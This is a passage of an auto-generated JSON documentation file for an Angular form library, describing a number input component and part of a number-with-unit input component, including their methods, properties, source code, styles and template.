                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 254,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnTouched",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 258,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDescribedByIds",
                "args": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 235,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDisabledState",
                "args": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 262,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "writeValue",
                "args": [
                  {
                    "name": "value",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 250,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "number",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "updateErrorState",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 25,
                "deprecated": false,
                "deprecationMessage": "",
                "inheritance": {
                  "file": "FormFieldBase"
                }
              }
            ],
        "deprecated": false,
        "deprecationMessage": "",
        "hostBindings": [
          {
            "name": "attr.aria-describedby",
            "defaultValue": "''",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 68,
            "type": "string",
            "decorators": []
          },
          {
            "name": "class.floating",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 61,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "id",
            "defaultValue": "`value-unit-input-${NumberInputComponent.nextId++}`",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 66,
            "type": "string",
            "decorators": []
          }
        ],
        "hostListeners": [],
        "description": "",
        "rawdescription": "\n",
        "type": "component",
        "sourceCode": "import {\r\n  ChangeDetectionStrategy,\r\n  Component,\r\n  DoCheck,\r\n  ElementRef,\r\n  EventEmitter,\r\n  HostBinding,\r\n  Input,\r\n  OnDestroy,\r\n  OnInit,\r\n  Optional,\r\n  Output,\r\n  Self,\r\n  ViewEncapsulation\r\n} from '@angular/core';\r\nimport { ControlValueAccessor, FormControl, FormGroupDirective, NgControl, NgForm } from '@angular/forms';\r\nimport { MatFormFieldControl } from '@angular/material/form-field';\r\nimport { Subject, Subscription } from 'rxjs';\r\nimport { FocusMonitor } from '@angular/cdk/a11y';\r\nimport { NumberInputPipe } from '../number-input.pipe';\r\nimport { coerceBooleanProperty } from '@angular/cdk/coercion';\r\nimport { startWith } from 'rxjs/operators';\r\nimport { ErrorStateMatcher } from '@angular/material/core';\r\nimport { FormFieldBase } from '../../sto-form/form-field.base';\r\n\r\n/*\r\nclass NumberInputBase {\r\n  constructor(public _elementRef: ElementRef,\r\n              public _defaultErrorStateMatcher: ErrorStateMatcher,\r\n              public _parentForm: NgForm,\r\n              public _parentFormGroup: FormGroupDirective,\r\n              public ngControl: NgControl) {}\r\n}\r\nconst _NumberInputBase: CanUpdateErrorStateCtor = mixinErrorState(NumberInputBase.constructor);\r\n*/\r\n\r\n\r\n@Component({\r\n  selector: 'sto-number-input',\r\n  templateUrl: './number-input.component.html',\r\n  styleUrls: [ './number-input.component.scss' ],\r\n  encapsulation: ViewEncapsulation.None,\r\n  changeDetection: ChangeDetectionStrategy.OnPush,\r\n  providers: [\r\n    { provide: MatFormFieldControl, useExisting: NumberInputComponent }\r\n  ]\r\n})\r\nexport class NumberInputComponent extends FormFieldBase implements DoCheck, OnInit, OnDestroy, ControlValueAccessor, MatFormFieldControl<number> {\r\n  static nextId = 0;\r\n  stateChanges = new Subject<void>();\r\n  private numberFormatter = new NumberInputPipe();\r\n  focused: boolean;\r\n  autofilled: boolean;\r\n  controlType = 'number-input';\r\n  ctrl = new FormControl();\r\n  public sub = new Subscription();\r\n  @Input()\r\n  dynamicFractionSize: boolean;\r\n\r\n  @HostBinding('class.floating')\r\n  get shouldLabelFloat() {\r\n    return this.focused || !this.empty;\r\n  }\r\n\r\n  @HostBinding()\r\n  id = `value-unit-input-${NumberInputComponent.nextId++}`;\r\n  @HostBinding('attr.aria-describedby')\r\n  describedBy = '';\r\n\r\n  errorState: boolean;\r\n\r\n  /*  get errorState() {\r\n      return this._errorState && (this.ngControl ? this.ngControl.touched : false);\r\n    }\r\n\r\n    set errorState(errorState) {\r\n      this._errorState = errorState;\r\n      this.stateChanges.next();\r\n    }\r\n\r\n    private _errorState: boolean;*/\r\n\r\n  @Output()\r\n  ngModelChange = new EventEmitter<number | null>();\r\n\r\n  @Input()\r\n  get disabled(): boolean {\r\n    return this._disabled;\r\n  }\r\n\r\n  set disabled(value: boolean) {\r\n    this._disabled = coerceBooleanProperty(value);\r\n    const opts = { onlySelf: true, emitEvent: false };\r\n    this._disabled ? this.ctrl.disable(opts) : this.ctrl.enable(opts);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _disabled = false;\r\n\r\n  @Input()\r\n  get readonly(): boolean {\r\n    return this._readonly;\r\n  }\r\n\r\n  set readonly(value: boolean) {\r\n    this._readonly = coerceBooleanProperty(value);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _readonly = false;\r\n\r\n  @Input()\r\n  get fractionSize() {\r\n    return this._fractionSize;\r\n  }\r\n\r\n  set fractionSize(fractionSize) {\r\n    if ( !fractionSize && fractionSize !== 0 ) {\r\n      fractionSize = 3;\r\n    }\r\n    this._fractionSize = fractionSize;\r\n    this.value = this._value;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _fractionSize: number;\r\n\r\n  get empty() {\r\n    const value = this.ctrl.value;\r\n    return !( value && value !== 0 );\r\n  }\r\n\r\n  @Input()\r\n  get placeholder() {\r\n    return this._placeholder || '';\r\n  }\r\n\r\n  set placeholder(plh) {\r\n    this._placeholder = plh;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _placeholder: string;\r\n\r\n  @Input()\r\n  get tabIndex() {\r\n    return this._tabIndex;\r\n  }\r\n\r\n  set tabIndex(tabIndex) {\r\n    this._tabIndex = tabIndex;\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _tabIndex: number;\r\n\r\n  @Input()\r\n  get required() {\r\n    return this._required;\r\n  }\r\n\r\n  set required(req) {\r\n    this._required = coerceBooleanProperty(req);\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _required = false;\r\n\r\n  @Input()\r\n  get value() {\r\n    return this._value;\r\n  }\r\n\r\n  set value(value) {\r\n    this._value = value;\r\n    const valueAsString = this.numberFormatter.transform(value, this.fractionSize, this.dynamicFractionSize);\r\n    this.ctrl.setValue(valueAsString, { emitEvent: false });\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  private _value: number | null;\r\n\r\n  constructor(@Optional() @Self() public ngControl: NgControl,\r\n              private fm: FocusMonitor,\r\n              @Optional() _parentForm: NgForm,\r\n              @Optional() _parentFormGroup: FormGroupDirective,\r\n              _defaultErrorStateMatcher: ErrorStateMatcher,\r\n              private elRef: ElementRef<HTMLElement>) {\r\n    super(elRef, _defaultErrorStateMatcher, _parentForm, _parentFormGroup, ngControl);\r\n    if ( this.ngControl != null ) {\r\n      this.ngControl.valueAccessor = this;\r\n    }\r\n    fm.monitor(elRef.nativeElement, true).subscribe(origin => {\r\n      this.focused = !!origin;\r\n      this.stateChanges.next();\r\n    });\r\n  }\r\n\r\n  ngDoCheck(): void {\r\n    if ( this.ngControl ) {\r\n      this.updateErrorState();\r\n    }\r\n  }\r\n\r\n  ngOnInit(): void {\r\n    const sub = this.ctrl.valueChanges\r\n      .subscribe((value: string) => {\r\n        let numericValue: null | number = parseFloat(this.numberFormatter.parse(value, this.fractionSize, this.dynamicFractionSize));\r\n        numericValue = isNaN(numericValue) ? null : numericValue;\r\n        this.onChange(numericValue);\r\n        this.ngModelChange.emit(numericValue);\r\n      });\r\n\r\n    this.sub.add(sub);\r\n    if ( this.ngControl && this.ngControl.statusChanges ) {\r\n      this.sub.add(this.ngControl.statusChanges\r\n        .pipe(startWith(this.ngControl.status))\r\n        .subscribe(() => {\r\n          this.updateErrorState();\r\n        }));\r\n    }\r\n  }\r\n\r\n  ngOnDestroy(): void {\r\n    this.stateChanges.complete();\r\n    this.fm.stopMonitoring(this.elRef.nativeElement);\r\n    this.sub.unsubscribe();\r\n  }\r\n\r\n  // eslint-disable-next-line @typescript-eslint/no-unused-vars\r\n  onContainerClick(event: MouseEvent): void {\r\n    this.elRef.nativeElement.querySelector('input')?.focus();\r\n  }\r\n\r\n  setDescribedByIds(ids: string[]): void {\r\n    this.describedBy = ids.join(' ');\r\n  }\r\n\r\n  // eslint-disable-next-line\r\n  onChange = (_: any) => {\r\n  }\r\n  // eslint-disable-next-line\r\n  onTouched = () => {\r\n  }\r\n\r\n  matOnTouched() {\r\n    this.stateChanges.next();\r\n  }\r\n\r\n  writeValue(value: number): void {\r\n    this.value = value;\r\n  }\r\n\r\n  registerOnChange(fn: never): void {\r\n    this.onChange = fn;\r\n  }\r\n\r\n  registerOnTouched(fn: never): void {\r\n    this.onTouched = fn;\r\n  }\r\n\r\n  setDisabledState(isDisabled: boolean): void {\r\n    this.disabled = isDisabled;\r\n  }\r\n\r\n\r\n}\r\n",
        "assetsDirs": [],
        "styleUrlsData": [
          {
            "data": ".mat-form-field.sto-form__field {\r\n  .sto-number-input {\r\n    border: none;\r\n    width: 100%;\r\n    background: none;\r\n    padding: 0;\r\n    outline: none;\r\n    font: inherit;\r\n  }\r\n}\r\n\r\n",
            "styleUrl": "./number-input.component.scss"
          }
        ],
        "stylesData": "",
        "constructorObj": {
          "name": "constructor",
          "description": "",
          "deprecated": false,
          "deprecationMessage": "",
          "args": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_parentForm",
              "type": "NgForm",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_parentFormGroup",
              "type": "FormGroupDirective",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "_defaultErrorStateMatcher",
              "type": "ErrorStateMatcher",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "line": 181,
          "jsdoctags": [
            {
              "name": "ngControl",
              "type": "NgControl",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "fm",
              "type": "FocusMonitor",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_parentForm",
              "type": "NgForm",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_parentFormGroup",
              "type": "FormGroupDirective",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "_defaultErrorStateMatcher",
              "type": "ErrorStateMatcher",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "elRef",
              "type": "ElementRef<HTMLElement>",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        },
        "extends": "FormFieldBase",
        "implements": [
          "DoCheck",
          "OnInit",
          "OnDestroy",
          "ControlValueAccessor",
          "MatFormFieldControl"
        ],
        "accessors": {
          "shouldLabelFloat": {
            "name": "shouldLabelFloat",
            "getSignature": {
              "name": "shouldLabelFloat",
              "type": "",
              "returnType": "",
              "line": 61
            }
          },
          "disabled": {
            "name": "disabled",
            "setSignature": {
              "name": "disabled",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "value",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 91,
              "jsdoctags": [
                {
                  "name": "value",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "disabled",
              "type": "boolean",
              "returnType": "boolean",
              "line": 87
            }
          },
          "readonly": {
            "name": "readonly",
            "setSignature": {
              "name": "readonly",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "value",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 105,
              "jsdoctags": [
                {
                  "name": "value",
                  "type": "boolean",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "readonly",
              "type": "boolean",
              "returnType": "boolean",
              "line": 101
            }
          },
          "fractionSize": {
            "name": "fractionSize",
            "setSignature": {
              "name": "fractionSize",
              "type": "void",
              "deprecated": false,
              "deprecationMessage": "",
              "args": [
                {
                  "name": "fractionSize",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": ""
                }
              ],
              "returnType": "void",
              "line": 117,
              "jsdoctags": [
                {
                  "name": "fractionSize",
                  "type": "",
                  "deprecated": false,
                  "deprecationMessage": "",
                  "tagName": {
                    "text": "param"
                  }
                }
              ]
            },
            "getSignature": {
              "name": "fractionSize",
              "type": "",
              "returnType": "",
              "line": 113
            }
          },
                "empty": {
                    "name": "empty",
                    "getSignature": {
                        "name": "empty",
                        "type": "",
                        "returnType": "",
                        "line": 128
                    }
                },
                "placeholder": {
                    "name": "placeholder",
                    "setSignature": {
                      "name": "placeholder",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 138,
                      "jsdoctags": [
                        {
                          "name": "plh",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "placeholder",
                    "type": "",
                    "returnType": "",
                    "line": 134
                  }
                },
                "tabIndex": {
                    "name": "tabIndex",
                    "setSignature": {
                      "name": "tabIndex",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "tabIndex",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 150,
                      "jsdoctags": [
                        {
                          "name": "tabIndex",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "tabIndex",
                    "type": "",
                    "returnType": "",
                    "line": 146
                  }
                },
                "required": {
                    "name": "required",
                    "setSignature": {
                      "name": "required",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 162,
                      "jsdoctags": [
                        {
                          "name": "req",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "required",
                    "type": "",
                    "returnType": "",
                    "line": 158
                  }
                },
                "value": {
                    "name": "value",
                    "setSignature": {
                      "name": "value",
                      "type": "void",
                      "deprecated": false,
                      "deprecationMessage": "",
                      "args": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": ""
                        }
                      ],
                      "returnType": "void",
                      "line": 174,
                      "jsdoctags": [
                        {
                          "name": "value",
                          "type": "",
                          "deprecated": false,
                          "deprecationMessage": "",
                          "tagName": {
                            "text": "param"
                          }
                        }
                      ]
                    },
                  "getSignature": {
                    "name": "value",
                    "type": "",
                    "returnType": "",
                    "line": 170
                  }
                }
        },
        "templateData": "<input numberInput\r\n       class=\"sto-number-input\"\r\n       (blur)=\"onTouched()\"\r\n       [fractionSize]=\"fractionSize\"\r\n       [dynamicFractionSize]=\"dynamicFractionSize\"\r\n       [placeholder]=\"placeholder\"\r\n       [readonly]=\"readonly\"\r\n       [tabindex]=\"readonly ? -1 : (tabIndex || 0)\"\r\n       type=\"text\"\r\n       [formControl]=\"ctrl\">\r\n<div>\r\n  <ng-content select=\"mat-option\"></ng-content>\r\n</div>\r\n"
      },
      {
        "name": "NumberUnitInputComponent",
        "id": "component-NumberUnitInputComponent-e781eee0f410e8ab683f1ff7198a8f4410b8ab05b844a5142fb0aa3aa7d4267b9d4035d97892bee3a6e960fbae8ead51f25f981bf2886cdbc9b113063bc9526e",
        "file": "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts",
        "changeDetection": "ChangeDetectionStrategy.OnPush",
        "encapsulation": [
          "ViewEncapsulation.None"
        ],
        "entryComponents": [],
        "inputs": [],
        "outputs": [],
        "providers": [
          {
            "name": "{ provide: MatFormFieldControl, useExisting: NumberUnitInputComponent }",
            "type": "component"
          }
        ],
        "selector": "sto-number-unit-input",
        "styleUrls": [
          "./number-unit-input.component.scss"
        ],
        "styles": [],
        "templateUrl": [
          "./number-unit-input.component.html"
        ],
        "viewProviders": [],
        "inputsClass": [
          {
            "name": "disabled",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 65,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "fractionSize",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 107,
            "type": "number",
            "decorators": []
          },
          {
            "name": "list",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 95,
            "type": "{}",
            "decorators": []
          },
          {
            "name": "placeholder",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 130,
            "type": "string",
            "decorators": []
          },
          {
            "name": "readonly",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 81,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "required",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 154,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "unitClearText",
            "defaultValue": "'(none)'",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 62,
            "type": "string",
            "decorators": []
          },
          {
            "name": "unitOptional",
            "defaultValue": "true",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 60,
            "type": "boolean",
            "decorators": []
          },
          {
            "name": "unitPlaceholder",
            "deprecated": false,
            "deprecationMessage": "",
            "line": 142,
            "type": "string",
            "decorators": []
          }
        ],
            "outputsClass": [],
            "propertiesClass": [
              {
                "name": "_disabled",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 78,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_fractionSize",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 116,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_list",
                "defaultValue": "[]",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "literal type[]",
                "optional": false,
                "description": "",
                "line": 104,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_placeholder",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 139,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_readonly",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 92,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_required",
                "defaultValue": "false",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 163,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_unitPlaceholder",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 151,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "_value",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NumberUnit | null",
                "optional": false,
                "description": "",
                "line": 185,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "autofilled",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 47,
                "modifierKind": [
                  144
                ]
              },
              {
                "name": "controlType",
                "defaultValue": "'number-unit-input'",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 48
              },
              {
                "name": "describedBy",
                "defaultValue": "''",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "string",
                "optional": false,
                "description": "",
                "line": 187,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": "'attr.aria-describedby'"
                  }
                ]
              },
              {
                "name": "errorState",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 57,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "focused",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "boolean",
                "optional": false,
                "description": "",
                "line": 123,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "form",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "FormGroup",
                "optional": false,
                "description": "",
                "line": 46,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "id",
                "defaultValue": "`value-unit-input-${NumberUnitInputComponent.nextId++}`",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 127,
                "decorators": [
                  {
                    "name": "HostBinding",
                    "stringifiedArguments": ""
                  }
                ]
              },
              {
                "name": "input",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef<HTMLInputElement>",
                "optional": false,
                "description": "",
                "line": 53,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "'input'"
                  }
                ]
              },
              {
                "name": "nextId",
                "defaultValue": "0",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "number",
                "optional": false,
                "description": "",
                "line": 44,
                "modifierKind": [
                  124
                ]
              },
              {
                "name": "ngControl",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NgControl",
                "optional": false,
                "description": "",
                "line": 192,
                "decorators": [
                  {
                    "name": "Optional",
                    "stringifiedArguments": ""
                  },
                  {
                    "name": "Self",
                    "stringifiedArguments": ""
                  }
                ],
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "numberFormatterPipe",
                "defaultValue": "new NumberInputPipe()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 49,
                "modifierKind": [
                  121
                ]
              },
              {
                "name": "numberInputDirective",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NumberInputDirective",
                "optional": false,
                "description": "",
                "line": 55,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "NumberInputDirective"
                  }
                ]
              },
              {
                "name": "onChange",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 265
              },
              {
                "name": "onTouched",
                "defaultValue": "() => {...}",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 268
              },
              {
                "name": "select",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "MatSelect",
                "optional": false,
                "description": "",
                "line": 51,
                "decorators": [
                  {
                    "name": "ViewChild",
                    "stringifiedArguments": "MatSelect"
                  }
                ]
              },
              {
                "name": "stateChanges",
                "defaultValue": "new Subject<void>()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 45,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "sub",
                "defaultValue": "new Subscription()",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "",
                "optional": false,
                "description": "",
                "line": 189,
                "modifierKind": [
                  123
                ]
              },
              {
                "name": "_defaultErrorStateMatcher",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ErrorStateMatcher",
                "optional": false,
                "description": "",
                "line": 19,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_elementRef",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ElementRef",
                "optional": false,
                "description": "",
                "line": 18,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_parentForm",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "NgForm",
                "optional": false,
                "description": "",
                "line": 20,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "_parentFormGroup",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "FormGroupDirective",
                "optional": false,
                "description": "",
                "line": 21,
                "modifierKind": [
                  123
                ],
                "inheritance": {
                  "file": "FormFieldBase"
                }
              },
              {
                "name": "errorStateMatcher",
                "deprecated": false,
                "deprecationMessage": "",
                "type": "ErrorStateMatcher",
                "optional": false,
                "description": "",
                "line": 16,
                "inheritance": {
                  "file": "FormFieldBase"
                }
              }
            ],
            "methodsClass": [
              {
                "name": "ngDoCheck",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 213,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnDestroy",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 240,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "ngOnInit",
                "args": [],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 220,
                "deprecated": false,
                "deprecationMessage": ""
              },
              {
                "name": "onContainerClick",
                "args": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 247,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "event",
                    "type": "MouseEvent",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnChange",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 275,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "registerOnTouched",
                "args": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 279,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "fn",
                    "type": "never",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDescribedByIds",
                "args": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 259,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "ids",
                    "type": "string[]",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "setDisabledState",
                "args": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 283,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "isDisabled",
                    "type": "boolean",
                    "deprecated": false,
                    "deprecationMessage": "",
                    "tagName": {
                      "text": "param"
                    }
                  }
                ]
              },
              {
                "name": "writeValue",
                "args": [
                  {
                    "name": "value",
                    "type": "NumberUnit | null",
                    "deprecated": false,
                    "deprecationMessage": ""
                  }
                ],
                "optional": false,
                "returnType": "void",
                "typeParameters": [],
                "line": 271,
                "deprecated": false,
                "deprecationMessage": "",
                "jsdoctags": [
                  {
                    "name": "value",
                    "type": "NumberUnit | null",
